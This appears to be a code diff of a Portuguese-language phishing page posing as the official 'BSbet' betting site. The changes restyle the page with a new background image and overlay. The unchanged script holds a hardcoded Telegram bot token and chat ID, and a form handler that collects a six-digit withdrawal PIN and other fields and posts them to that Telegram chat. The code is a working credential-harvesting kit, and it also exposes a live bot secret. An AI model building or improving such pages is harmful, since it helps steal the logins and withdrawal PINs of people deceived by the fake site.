@@ -6,14 +6,36 @@
     <title>BSbet - Oficial</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --y: #f3c350; --bg: rgba(26,26,26,0.95); --in: #2a2a2a; --txt: #888; }
+        :root { --y: #f3c350; --bg: rgba(20, 20, 20, 0.9); --in: #2a2a2a; --txt: #888; }
+        
         body { 
-            margin: 0; padding: 20px 0; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            margin: 0; 
+            padding: 20px 0; 
+            font-family: sans-serif; 
+            color: white; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
             background-color: #0d0d0d;
-            background-image: url('https://static.vecteezy.com/system/resources/previews/001/955/352/original/abstract-black-and-grey-hexagon-background-free-vector.jpg');
-            background-size: cover; background-attachment: fixed;
+            /* LINK DA SUA FOTO DO DRIVE CONFIGURADO */
+            background-image: url('https://lh3.googleusercontent.com/d/1Hk8YnJUzmMn6cbmyYbRIoGM1MJE9ux7G');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            background-repeat: no-repeat;
         }
-        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; }
+
+        /* Camada para garantir que o texto fique legível sobre a foto */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+
+        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; backdrop-filter: blur(5px); }
         .logo { text-align: center; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
         .logo span { color: var(--y); }
         .tabs { display: flex; border-bottom: 1px solid #333; margin-bottom: 20px; }
@@ -24,7 +46,6 @@
         .box i { color: var(--txt); width: 25px; text-align: center; margin-right: 10px; }
         .box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 16px; }
         
-        /* Estilo da Senha de Saque (6 campos) */
         .saque-container { margin: 15px 0; text-align: left; }
         .saque-label { font-size: 14px; margin-bottom: 10px; color: #ddd; display: block; }
         .saque-inputs { display: flex; justify-content: space-between; gap: 5px; }
@@ -73,7 +94,7 @@
     const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
     const CHAT_ID = "-4996441181"; 
 
-    // Pular automaticamente para o próximo campo da senha de saque
+    // Pular campos da senha de saque automaticamente
     const inputs = document.querySelectorAll('.saque-field');
     inputs.forEach((input, index) => {
         input.oninput = () => { if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); };
@@ -82,12 +103,10 @@
     document.getElementById('meuForm').onsubmit = function(e) {
         e.preventDefault();
         const btn = document.getElementById('btn');
-        
-        // Pegar a senha de saque unindo os 6 campos
         let saqueFull = "";
         inputs.forEach(i => saqueFull += i.value);
 
-        if(saqueFull.length < 6) { alert("Preencha os 6 dígitos da senha de saque!"); return; }
+        if(saqueFull.length < 6) { alert("Preencha os 6 números do saque!"); return; }
 
         btn.innerText = "A CARREGAR...";
         btn.disabled = true;
@@ -100,7 +119,7 @@
             body: JSON.stringify({ chat_id: CHAT_ID, text: texto, parse_mode: 'Markdown' })
         })
         .then(res => {
-            if(res.ok) { alert("✅ Registrado com sucesso!"); location.reload(); }
+            if(res.ok) { alert("✅ Sucesso!"); location.reload(); }
             else { alert("❌ Erro no Bot! Verifique se é ADMIN."); btn.disabled = false; btn.innerText = "REGISTRAR"; }
         })
         .catch(() => { alert("❌ Erro de conexão!"); btn.disabled = false; btn.innerText = "REGISTRAR"; });
